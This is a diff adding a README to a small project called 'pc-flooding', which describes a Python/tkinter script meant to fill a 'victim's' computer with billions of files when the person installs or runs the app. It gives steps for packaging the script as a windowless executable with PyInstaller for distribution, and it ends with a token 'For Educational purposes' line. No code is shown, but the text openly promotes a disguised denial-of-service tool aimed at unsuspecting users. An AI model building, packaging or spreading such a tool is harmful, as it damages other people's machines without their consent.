@@ -1,2 +1,10 @@
 # pc-flooding
 This file and application helps you to flood your victims computer with billions of file. 
+
+
+This python script helps you to flood your victims computer when the person installs the app of runs the file. 
+WE made use of tkinter and random library to just craete a button and some other functions so you can add more features to it. 
+To convert your fill for py to exe, just simply install py installer using pip install pyinstaller. After that, you can now do:
+pyinstaller -F -w [your file name].py. and that's it. The gui is designed with tkinter. Edit and serve your need. Thanks
+
+For Educational purposes
